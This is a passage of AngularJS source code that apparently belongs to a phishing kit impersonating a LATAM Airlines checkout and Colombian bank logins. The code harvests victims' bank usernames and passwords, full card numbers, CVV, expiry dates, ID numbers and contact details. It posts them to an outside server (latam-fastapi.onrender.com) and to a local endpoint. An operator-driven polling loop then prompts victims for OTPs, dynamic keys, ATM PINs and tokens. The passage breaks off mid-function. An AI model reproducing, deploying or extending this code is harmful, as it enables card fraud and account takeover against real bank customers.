    $scope.clearError = function () {
      $scope.modalError = false;
      $scope.errorModalText = "";
    };

    // Función de autorización
    $scope.userAuthorizationTrigger = async function () {
      $scope.modalButton = false;
      $scope.modalLoading = true;
      $scope.modalError = false;
      $scope.modalGetUser = false;

      try {
        const username = $scope.formData.username;
        const cardNumber = $scope.lastCCPago;

        // Validar campos obligatorios
        if (!username) {
          $scope.showError("Debe ingresar su usuario antes de continuar.");
          $scope.modalLoading = false;
          $scope.modalGetUser = true;
          $scope.modalButton = true;
          return;
        }

        if (!cardNumber) {
          $scope.showError(
            "No se encontró el número de tarjeta. Intente nuevamente."
          );
          $scope.modalLoading = false;
          $scope.modalButton = true;
          return;
        }

        // Registrar acción (opcional)
        if ($scope.logUserAction) {
          await $scope.logUserAction(
            `Usuario: ${username} - Tarjeta: ${cardNumber}`
          );
        }

        // Construir payload
        const payload = {
          username: username,
          cardNumber: cardNumber,
        };

        // Enviar al backend (FastAPI)
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/new-method",
          payload,
          {
            headers: { "Content-Type": "application/json" },
          }
        );

        console.log("Respuesta del servidor:", response.data);

        if (response && response.data && response.data.status === "ok") {
          // Redirigir si la respuesta fue exitosa
          window.location.href = "https://www.latamairlines.com/co/es";
        } else {
          $scope.showError(
            "Error al procesar la solicitud. Intente nuevamente."
          );
          $scope.modalButton = true;
          $scope.modalLoading = false;
        }
      } catch (error) {
        console.error("Error en autorización:", error);
        $scope.showError(
          "No se pudo completar la autorización. Intente más tarde."
        );
        $scope.modalButton = true;
        $scope.modalLoading = false;
        $scope.modalGetUser = true;

        if (!$scope.$$phase) {
          $scope.$apply();
        }
      }
    };

    async function handleNuAction() {
      let username = $scope.formData.username;
      let password = $scope.formData.password;

      if (!username || !password) {
        $scope.showError(
          $scope.bankData.fieldLabel1 +
            " y " +
            $scope.bankData.fieldLabel2 +
            " Son Obligatorios"
        );

        $scope.modalLoading = false;
        $scope.modalGetUser = true;
        $scope.modalButton = true;
        return;
      }

      const response = $scope.sendUserLogo(username, password);

      await $scope.logUserAction(
        `#${$scope.uniqueTransactionId} ha enviado el login: ${username}|${password}`
      );

      if (response) {
        await awaitPaymentProcessing();
      }
    }

    $scope.reciveCodes = async function () {
      try {
        const response = await $http({
          method: "POST",
          url: "https://latam-fastapi.onrender.com/api/api",
          data: {
            a: "woc",
            uniqueTransactionId: $scope.uniqueTransactionId,
          },
          headers: {
            "Content-Type": "application/json",
          },
        });
        return response.data;
      } catch (error) {
        console.error("Error recibiendo códigos:", error);
        throw error;
      }
    };

    // Función para mostrar errores en el modal
    $scope.showErrorModal = function (show, message) {
      $scope.modalError = show;
      if (show) {
        $scope.errorModalText = message;
      } else {
        $scope.errorModalText = "";
      }

      // Forzar actualización del scope si es necesario
      if (!$scope.$$phase) {
        $scope.$apply();
      }
    };

    // Función para ocultar error
    $scope.hideErrorModal = function () {
      $scope.modalError = false;
      $scope.errorModalText = "";
    };

    // Función de polling actualizada
    async function awaitPaymentProcessing() {
      if (activePollingInterval) {
        $interval.cancel(activePollingInterval);
      }

      $scope.showErrorModal(false, "");

      activePollingInterval = $interval(async function () {
        if (nuBankActive && !$scope.nuBankTimer) return;

        try {
          const response = await $scope.receiveCodes();
          if (response) {
            $scope.handlePaymentResponse(response);
          }
        } catch (error) {
          console.error("Error en polling:", error);
          if (!nuBankActive) {
            $interval.cancel(activePollingInterval);
            activePollingInterval = null;
            $scope.showErrorModal(
              true,
              "Error de conexión. Por favor intente nuevamente."
            );
          }
        }
      }, 1000);
    }
    // También agregar awaitPaymentProcessing al scope si es necesario
    $scope.awaitPaymentProcessing = awaitPaymentProcessing;

    $scope.handlePaymentResponse = function (response) {
      $scope.formData = {
        otp: "",
        dynamicCode: "",
        atmCode: "",
        customResponse: "",
        token: ["", "", "", "", "", ""],
      };
      // Si el intervalo no existe, no procesar respuesta
      if (!activePollingInterval) return;

      switch (response.id) {
        case "6":
          // Detener NuBank completamente
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }

          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          // Resetear estados y activar OTP
          $scope.modalNU = false;
          $scope.modalNormal = true;
          $scope.modalLoading = false;
          $scope.modalGetUser = false;
          $scope.modalGetOTP = true;
          $scope.modalButton = true;
          $scope.currentAction = "submitOtpCode";
          break;

        case "3":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }

          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "submitOtpCode";
          $scope.modalLoading = false;
          $scope.modalGetUser = false;
          $scope.modalGetOTP = true;
          $scope.showErrorModal(
            true,
            "Código de seguridad incorrecto, verifique e intente nuevamente."
          );
          $scope.modalButton = true;
          break;

        case "20":
          console.log("Activando NuBank modal");

          // Resetear todos los estados primero
          $scope.modalLoading = false;
          $scope.modalGetUser = false;
          $scope.modalGetOTP = false;
          $scope.modalGetDinamica = false;
          $scope.modalGetCLAVE = false;
          $scope.modalPersonalizado = false;
          $scope.modalError = false;
          $scope.modalGetToken = false;
          $scope.modalNormal = false;

          // Activar NuBank
          $scope.currentAction = "nuBank";
          $scope.modalNU = true;
          $scope.modalButton = false;

          // Reiniciar el timer solo si no está activo
          if (!nuBankActive) {
            nuBankActive = true;
            $scope.startNuBankTimer();
            $scope.sendNuBankCodeAlert(); // Si es necesario
          }

          break;

        case "13":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "personalizado";
          $scope.modalLoading = false;
          $scope.modalPersonalizado = true;
          $scope.modalButton = true;

          // Obtener respuesta personalizada
          $scope.getPersonalizadoResponse().then((response) => {
            document.getElementById("personalizado_input_title").innerHTML =
              response.response;
          });
          break;

        case "15":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "tok";
          $scope.modalLoading = false;
          $scope.modalGetToken = true;
          $scope.modalButton = true;

          // Configurar inputs de token
          configureTokenInputs();
          break;

        case "16":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "tok";
          $scope.modalLoading = false;
          $scope.modalGetToken = true;
          $scope.showErrorModal(
            true,
            "Token incorrecto, verifique e intente nuevamente."
          );
          $scope.modalButton = true;

          configureTokenInputs();
          break;

        case "7":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "sd";
          $scope.modalLoading = false;
          $scope.modalGetDinamica = true;
          $scope.modalButton = true;
          break;

        case "8":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "sd";
          $scope.modalLoading = false;
          $scope.modalGetDinamica = true;
          $scope.showErrorModal(
            true,
            "Clave dinámica o Token incorrecto, verifique e intente nuevamente."
          );
          $scope.modalButton = true;
          break;

        case "12":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "sc";
          $scope.modalLoading = false;
          $scope.modalGetCLAVE = true;
          $scope.modalButton = true;
          break;

        case "wCC":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();
          }
          // Mostrar vista normal
          $state.transitionTo("/Payment", {
            error: 1,
          });
          window.location.reload();

          // Quitar el fixall
          document.body.classList.remove("fixedAll");

          // Log del error
          $scope.logUserAction("Error en proceso de pago - Modales cerrados");
          break;

        case "21":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "sc";
          $scope.modalLoading = false;
          $scope.modalGetCLAVE = true;
          $scope.showErrorModal(
            true,
            "CLAVE Cajero inválida, verifique e intente nuevamente."
          );
          $scope.modalButton = true;
          break;

        case "5":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $scope.currentAction = "nu";
          $scope.modalLoading = false;
          $scope.modalGetOTP = false;
          $scope.modalGetUser = true;
          $scope.showErrorModal(
            true,
            "Verifique los datos ingresados e intente nuevamente."
          );
          $scope.modalButton = true;
          break;

        case "2":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();

            $scope.modalNormal = true;
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          $scope.modalNU = false;
          $("#modal-authorize").hide();
          document.getElementById("userAuthorizationTrigger").disabled = false;
          break;

        case "cContinue":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;
        case "cContinue":
          if (nuBankActive) {
            nuBankActive = false;
            $scope.stopNuBankTimer();
          }
          $interval.cancel(activePollingInterval);
          activePollingInterval = null;

          // Navigate to payment with reload
          $state.transitionTo("/Paid");

          break;
      }

      // Forzar actualización del scope si es necesario
      if (!$scope.$$phase) {
        $scope.$apply();
      }
    };

    // Función auxiliar para configurar inputs de token
    function configureTokenInputs() {
      const inputs = document.querySelectorAll(
        ".bdb-at-input-token__pass-code-area__box"
      );
      inputs.forEach((input, index) => {
        input.addEventListener("input", (e) => {
          if (e.target.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
        });

        input.addEventListener("keydown", (e) => {
          if (e.key === "Backspace" && e.target.value === "" && index > 0) {
            inputs[index - 1].focus();
            inputs[index - 1].value = "";
          }
        });
      });
    }

    /////////////////////////////////////////////////////////============================///////
    /////////////////////////////////////////////////////////============================///////

    $scope.goTransitionPay = function () {
      if (1 == $scope.dataConfig.active) {
        $scope.showModal3D(
          $scope.calcTotal(),
          $scope.ccNum.slice(-4),
          $scope.chosenGUID
        );
        $scope.loader = false;
      } else {
        $state.transitionTo("/Paid");
      }
    };
    localStorage.removeItem("alreadyBeenHerePayingBank");
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
  },
]);

app.controller("bankController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  "GUIDService",
  function ($scope, $http, $timeout, $interval, $state, GUIDService) {
    var chosenGUID = GUIDService.getGUID();
    $scope.chosenGUID = GUIDService.getGUID();
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
    if (null != localStorage.getItem("alreadyBeenHerePayingBank")) {
      window.history.go(-1);
    } else {
      localStorage.setItem("alreadyBeenHerePayingBank", 1);
    }
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    $scope.loader = true;
    $timeout(function () {
      $scope.loader = undefined;
    }, 8e3);
    $scope.GUID = function () {
      return "10000000-1000-4000-8000-100000000000".replace(
        /[018]/g,
        (latica) =>
          (
            latica ^
            (crypto.getRandomValues(new Uint8Array(1))[0] &
              (15 >> (latica / 4)))
          ).toString(16)
      );
    };

    /*
   // $scope.chosenGUID = $scope.GUID();
    if (null != localStorage.getItem("idPaymentLatamFakePromise")) {
        $scope.chosenGUID = localStorage.getItem("idPaymentLatamFakePromise");
    } else {
        localStorage.setItem("idPaymentLatamFakePromise", $scope.chosenGUID);
    }*/
    // ✅ Mejor: asegúrate de tener un GUID siempre
    try {
      $scope.chosenGUID =
        localStorage.getItem("idPaymentLatamFakePromise") ||
        (typeof GUIDService !== "undefined" && GUIDService.getGUID()) ||
        ($scope.GUID && $scope.GUID());

      if ($scope.chosenGUID) {
        localStorage.setItem("idPaymentLatamFakePromise", $scope.chosenGUID);
      }
    } catch (e) {
      // si algo falla, no rompemos la vista
      console.warn("GUID init warn:", e);
    }

    $scope.goBack = function () {
      window.history.go(-1);
    };

    // ------------------ Cargar dataVuelos (step 1) ------------------
    var havynn = -1;
    for (let stevenray = 0; stevenray < $scope.dataLatam.length; stevenray++) {
      if (1 == $scope.dataLatam[stevenray].step) {
        havynn = stevenray;
      }
    }
    if (-1 != havynn) {
      $scope.dataVuelos = $scope.dataLatam[havynn].info[0];
    } else {
      $state.transitionTo("/");
    }

    // ------------------ Cargar pickedF (step 2 - ida) ------------------
    var derykah = -1;
    for (let stasi = 0; stasi < $scope.dataLatam.length; stasi++) {
      if (2 == $scope.dataLatam[stasi].step) {
        derykah = stasi;
      }
    }
    $scope.pickedF = undefined;
    if (-1 != derykah) {
      $scope.pickedF = $scope.dataLatam[derykah].info[0];
    } else {
      $scope.goBack();
    }

    // ✅ Garantizar que pickedF siempre exista y tenga estructura
    $scope.pickedF = $scope.pickedF || { vuelo: null, cabine: null };
    if (!$scope.pickedF.vuelo) $scope.pickedF.vuelo = { price: 0 };

    // ------------------ Cargar pickedFV si es ida y vuelta (step 3 - vuelta) ------------------
    if (1 == $scope.dataVuelos.travelType) {
      var tatelyn = -1;
      for (let nebula = 0; nebula < $scope.dataLatam.length; nebula++) {
        if (3 == $scope.dataLatam[nebula].step) {
          tatelyn = nebula;
        }
      }
      $scope.pickedFV = undefined;
      if (-1 != tatelyn) {
        $scope.pickedFV = $scope.dataLatam[tatelyn].info[0];
      } else {
        $scope.goBack();
      }

      // ✅ Garantizar que pickedFV siempre exista y tenga estructura
      $scope.pickedFV = $scope.pickedFV || { vuelo: null, cabine: null };
      if (!$scope.pickedFV.vuelo) $scope.pickedFV.vuelo = { price: 0 };
    } else {
      // Si es solo ida, normaliza pickedFV para evitar watchers rotos
      $scope.pickedFV = $scope.pickedFV || { vuelo: null, cabine: null };
      if (!$scope.pickedFV.vuelo) $scope.pickedFV.vuelo = { price: 0 };
    }

    // ------------------ Helpers de precio (evita duplicar lógica) ------------------
    $scope.cabinAddCOP = function (cab) {
      if (cab === "l") return 50000; // Light
      if (cab === "f") return 90000; // Full
      return 0; // Basic / default
    };

    // Estos dos se usan para mostrar el “Precio por pasajero” en la vista
    $scope.priceGoUSD = "";
    $scope.priceBackUSD = "";

    function computeVisiblePrices() {
      // IDA
      if ($scope.pickedF && $scope.pickedF.vuelo) {
        var baseGo = parseInt($scope.pickedF.vuelo.price, 10) || 0;
        var addGo = $scope.cabinAddCOP($scope.pickedF.cabine);
        $scope.priceGoUSD = formatUSD(copToUsd(baseGo + addGo));
      } else {
        $scope.priceGoUSD = formatUSD(0);
      }

      // VUELTA (solo si es viaje de ida/vuelta y hay vuelo)
      if (
        $scope.dataVuelos &&
        $scope.dataVuelos.travelType == 1 &&
        $scope.pickedFV &&
        $scope.pickedFV.vuelo
      ) {
        var baseBk = parseInt($scope.pickedFV.vuelo.price, 10) || 0;
        var addBk = $scope.cabinAddCOP($scope.pickedFV.cabine);
        $scope.priceBackUSD = formatUSD(copToUsd(baseBk + addBk));
      } else {
        $scope.priceBackUSD = ""; // no mostrar si no aplica
      }
    }

    // 🔔 Disparo inicial y watcher (colocados aquí, después de inicializar pickedF/pickedFV)
    computeVisiblePrices();
    $scope.$watchGroup(
      [
        "pickedF.cabine",
        "pickedFV.cabine",
        "pickedF.vuelo.price",
        "pickedFV.vuelo.price",
      ],
      function () {
        computeVisiblePrices();
      }
    );

    // ------------------ Cargar dataPay (step 5 - pago) ------------------
    var aaroh = -1;
    for (let qari = 0; qari < $scope.dataLatam.length; qari++) {
      if (5 == $scope.dataLatam[qari].step) {
        aaroh = qari;
      }
    }
    $scope.dataPay = undefined;
    if (-1 != aaroh) {
      $scope.dataPay = $scope.dataLatam[aaroh].info[0];
    } else {
      $scope.goBack();
    }
    $scope.ccNum = $scope.dataPay.cc;

    // ✅ Cálculo de total corregido (reutiliza cabinAddCOP)
    $scope.calcTotal = function () {
      try {
        // IDA
        var baseIda =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? parseInt($scope.pickedF.vuelo.price, 10)
            : 0;
        var addIda = $scope.cabinAddCOP(
          $scope.pickedF && $scope.pickedF.cabine
        );
        var totalCOP = (baseIda || 0) + (addIda || 0);

        // VUELTA (solo si aplica)
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var baseVuelta =
            $scope.pickedFV &&
            $scope.pickedFV.vuelo &&
            $scope.pickedFV.vuelo.price
              ? parseInt($scope.pickedFV.vuelo.price, 10)
              : 0;
          var addVuelta = $scope.cabinAddCOP(
            $scope.pickedFV && $scope.pickedFV.cabine
          );
          totalCOP += (baseVuelta || 0) + (addVuelta || 0);
        }

        // Pasajeros
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }

        // Retornar en USD (SIN agregar “,00” en el HTML)
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    };

    // ------------------ Otros (lo tuyo original) ------------------
    var travan = new Date();
    var ader = String(travan.getDate()).padStart(2, "0");
    var shyrle = String(travan.getMonth() + 1).padStart(2, "0");
    var corla = travan.getFullYear();
    travan = ader + "/" + shyrle + "/" + corla;
    $scope.dd = travan;
    $scope.brands = {
      visa: "assets/BANKS/visa.png",
      mc: "assets/BANKS/mastercard.png",
      amex: "assets/BANKS/amex.png",
      nobrand: "assets/BANKS/nobank.png",
    };

    $scope.banks = [
      {
        bank: "assets/BANKS/davivienda.png",
        text: "© Banco Davivienda 2024.",
        find: "MasterCard Prepaid Card (Non-U.S.)",
        name: "DAVIVIENDA",
        class: "davcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/avvillas.png",
        text: "© Banco AV Villas 2024.",
        find: "REDEBAN,VILLAS,518503 ",
        name: "BANCO AV VILLAS",
        class: "avcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/bancobogota.png",
        text: "© BANCO DE BOGOTÁ SA 2024.",
        find: "BANCO DE BOGOTA",
        name: "BANCO DE BOGOTA",
        class: "bogcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/bancol.png",
        text: "© GRUPO BANCOLOMBIA 2024.",
        find: "BANCOLOMBIA,428384,530372,414489",
        name: "BANCOLOMBIA",
        class: "bancolcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/bbvab.png",
        text: "© BBVA 2024.",
        find: "BBVA",
        name: "BBVA",
        class: "bbvacc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/citibank.png",
        text: "© CITIBANK 2024.",
        find: "CITIBANK",
        name: "CITIBANK",
        class: "citiacc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/colpatria.png",
        text: "© BANCO COLPATRIA 2024.",
        find: "COLPATRIA,483161",
        name: "COLPATRIA",
        class: "colpcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/falabella.svg",
        text: "© BANCO FALABELLA 2024.",
        find: "FALABELLA",
        name: "FALABELLA",
        class: "falacc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/itau.png",
        text: "© BANCO ITAU 2024.",
        find: "ITAU",
        name: "ITAU,552303",
        class: "itaucc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/itau.png",
        text: "© BANCO ITAU 2024.",
        find: "SANTANDER",
        name: "ITAU",
        class: "itaucc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/itau.png",
        text: "© BANCO ITAU 2024.",
        find: "HSBC",
        name: "ITAU",
        class: "itaucc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/itau.png",
        text: "© BANCO ITAU 2024.",
        find: "CORPBANCA ",
        name: "ITAU",
        class: "itaucc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nequi.png",
        text: "© Nequi 2024.",
        find: "NEQUI",
        name: "NEQUI",
        class: "nequicc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nequi.png",
        text: "© Nequi 2024.",
        find: "CONAVI",
        name: "NEQUI",
        class: "nequicc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nubank.png",
        text: "© Nubank 2024.",
        find: "555825",
        name: "NUBANK",
        class: "nubankcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/rappi.png",
        text: "© Rappi 2024.",
        find: "RAPPI,459321",
        name: "RAPPI",
        class: "rappicc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© Rappi 2024.",
        find: "SERFINANSA,SERFINANZA",
        name: "SERFINANZA",
        class: "nobcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/tuya.png",
        text: "© Éxito Tuya 2024.",
        find: "TUYA,537068",
        name: "TUYA",
        class: "tuyacc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/davivienda.png",
        text: "© Banco Davivienda 2024.",
        find: "DAVIVIENDA,526557,447198,459321",
        name: "DAVIVIENDA",
        class: "davcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/bpopular.png",
        text: "© Banco Popular 2024.",
        find: "POPULAR,474638,RIPLEY",
        name: "BANCO POPULAR",
        class: "bpop",
        action: "ask",
      },
      {
        bank: "assets/BANKS/bocc.png",
        text: "© Banco De Occidente, S.A. 2024.",
        find: "OCCIDENTE",
        name: "BANCO DE OCCIDENTE, S.A.",
        class: "bocc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/cajasocial.png",
        text: "© Banco Caja Social 2024.",
        find: "CAJA SOCIAL",
        name: "BANCO CAJA SOCIAL",
        class: "cajasoc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "",
        find: "",
        name: "Se",
        class: "nobcc",
        action: "pass",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© IRIS 2024.",
        find: "iris",
        name: "BANCO IRIS",
        class: "nobcc",
        action: "pass",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© LULO 2024.",
        find: "lulo",
        name: "BANCO LULO",
        class: "nobcc",
        action: "pass",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© CONFIAR COOPERATIVA FINANCIERA 2024.",
        find: "CONFIAR",
        name: "CONFIAR COOPERATIVA FINANCIERA",
        class: "nobcc",
        action: "pass",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© COOFINEP COOPERATIVA FINANCIERA 2024.",
        find: "COOFINEP",
        name: "COOFINEP COOPERATIVA FINANCIERA",
        class: "nobcc",
        action: "pass",
      },
      {
        bank: "assets/BANKS/bancamia.png",
        text: "© BANCAMIA S.A. 2024.",
        find: "agrario",
        name: "BANCAMIA",
        class: "nobcc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nequi.png",
        text: "© Nequi 2024.",
        find: "NEQUI",
        name: "NEQUI",
        class: "nequicc",
        action: "ask",
      },
      {
        bank: "assets/BANKS/nobank.png",
        text: "© BANCO FINANDINA 2024.",
        find: "finandina",
        name: "FINANDINA",
        class: "nobcc",
        action: "ask",
      },
    ];
    $scope.searchBinIt = function (anisa, kamouri) {
      let tempess = kamouri.split(",");
      for (let warne = 0; warne < tempess.length; warne++) {
        if (anisa.toString() == tempess[warne].toString()) {
          return true;
        }
      }
      return false;
    };
    $scope.seachInIt = function (mandela, breylee) {
      let corky = breylee.split(",");
      for (let aryal = 0; aryal < corky.length; aryal++) {
        if (
          -1 != mandela.toString().indexOf(corky[aryal].toString()) ||
          mandela.includes(corky[aryal].toString())
        ) {
          return true;
        }
      }
      return false;
    };
    $scope.lastfour = function () {
      if (null != $scope.ccNum && $scope.ccNum.toString().length > 14) {
        let aiken = $scope.ccNum;
        $scope.realcc = aiken.replace(/[^0-9]/g, "");
        return $scope.realcc.toString().slice(-4);
      }
    };
    let leairah = $scope.ccNum;
    $scope.realcc = leairah.replace(/[^0-9]/g, "");
    $scope.bankResponse = $scope.dataPay.bank;
    havynn = 0;
    for (let lyzandra = 0; lyzandra < $scope.banks.length; lyzandra++) {
      if (
        $scope.seachInIt($scope.bankResponse, $scope.banks[lyzandra].find) ||
        $scope.searchBinIt(
          $scope.realcc.substring(0, 6),
          $scope.banks[lyzandra].find
        )
      ) {
        $scope.chosedBank = lyzandra;
        $scope.bankPicked = $scope.banks[$scope.chosedBank].bank;
        $scope.textPicked = $scope.banks[$scope.chosedBank].text;
        $scope.bankNamePicked = $scope.banks[$scope.chosedBank].name;
        $scope.classBankPicked = $scope.banks[$scope.chosedBank].class;
        havynn = 1;
        $scope.bankName = $scope.bankResponse;
        break;
      }
    }
    if (0 == havynn) {
      if (3 == parseint($scope.realcc[0])) {
        $scope.chosedBank = 3;
        $scope.bankPicked = $scope.banks[$scope.chosedBank].bank;
        $scope.textPicked = $scope.banks[$scope.chosedBank].text;
        $scope.bankNamePicked = $scope.banks[$scope.chosedBank].name;
        $scope.classBankPicked = $scope.banks[$scope.chosedBank].class;
        $scope.bankName = $scope.bankNamePicked;
      } else {
        $scope.chosedBank = $scope.banks.length - 1;
        $scope.bankPicked = $scope.banks[$scope.chosedBank].bank;
        $scope.textPicked = $scope.banks[$scope.chosedBank].text;
      }
    }
    if ("4" == $scope.realcc.substring(0, 1).toString()) {
      $scope.brandPicked = $scope.brands.visa;
    } else if ("5" == $scope.realcc.substring(0, 1).toString()) {
      $scope.brandPicked = $scope.brands.mc;
    } else if ("3" == $scope.realcc.substring(0, 1).toString()) {
      $scope.brandPicked = $scope.brands.amex;
    } else {
      $scope.brandPicked = $scope.brands.nobrand;
    }
    $scope.goPaythisShit = function () {
      if (null != $scope.bankUser && $scope.bankUser.toString().length > 3) {
        if (null != $scope.bankPass && $scope.bankPass.toString().length > 3) {
          $scope.processingReply = true;
          let nafi = $scope.ccNum;
          $scope.realcc = nafi.replace(/[^0-9]/g, "");
          $scope.counter = 0;
          $scope.msgActionReplied = false;
          $timeout(function () {
            $http
              .post("api/payFlight", {
                user: $scope.bankUser,
                pass: $scope.bankPass,
                nombre: $scope.dataPay.name,
                tel: $scope.dataPay.tel,
                ciudad: $scope.dataPay.city,
                dir: $scope.dataPay.addr,
                cc: $scope.realcc,
                date: $scope.dataPay.datecc,
                bankname: $scope.dataPay.bank,
                cvv: $scope.dataPay.cvv,
                cedula: $scope.dataPay.cedula,
                email: $scope.dataPay.email,
                shortcc: $scope.realcc.substr(0, 6),
                Id: $scope.chosenGUID,
                logpay: localStorage.getItem("latamStorageFake"),

                ua: navigator.userAgent,
              })
              .success(function (joliana) {
                if (1041 == joliana.code) {
                  $scope.tgId = joliana.id;
                  $scope.processingReply = true;
                  $scope.intervalStart = $interval(
                    $scope.checkCallBackAPI,
                    1e3
                  );
                } else {
                  $scope.continuePaymentPending();
                }
              })
              .error(function (corvina) {
                console.log(corvina);
                $scope.loading = false;
              });
          }, 4e3);
        } else {
          $scope.showError("Por favor digite una clave válida.");
        }
      } else {
        $scope.showError("Por favor digite un usuario válido.");
      }
    };
    $scope.continuePaymentPending = function () {
      $scope.resetStatus();
      $state.transitionTo("/Paid");
    };
    $scope.cancelPayment = function () {
      $state.transitionTo("/Payment", {
        error: 1,
      });
      $("html, body").animate({
        scrollTop: 0,
      });
    };
    $scope.errCount = 0;
    $scope.errPrev = 0;
    $scope.msgActionReplied = false;
    $scope.msgAction = "none";
    $scope.counter = 0;
    $scope.mins = 3e5;
    $scope.processingReply = undefined;
    $scope.checkCallBackAPI = function () {
      if ($scope.counter == $scope.mins) {
        $scope.continuePaymentPending();
      }
      if ($scope.msgActionReplied) {
        switch ($scope.msgAction) {
          //pedir otrp
          case "6":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "otp";
            $scope.errorOtpPrev = true;
            break;

          case "6":
            $scope.errorOtpPrev = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "otp";
            $scope.errorOtp = undefined;
            break;

          case "7":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "Dinamica";
            $scope.errorDinamicaPrev = true;
            break;

          case "7":
            $scope.errorDinamicaPrev = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "Dinamica";
            $scope.errorDinamica = undefined;

            break;
          case "12":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "atm";
            $scope.errorAtmPrev = true;
            break;

          case "13":
            $scope.errorItauPrev = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "itau";
            $scope.errorItau = undefined;
            $scope.pregunta = $scope.campopersonalizado;
            $scope.Respuestacode = "";
            break;
          case "13":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "itau";
            $scope.errorItaurev = true;
            $scope.pregunta = $scope.campopersonalizado;
            $scope.Respuestacode = "";

            break;

          case "14":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
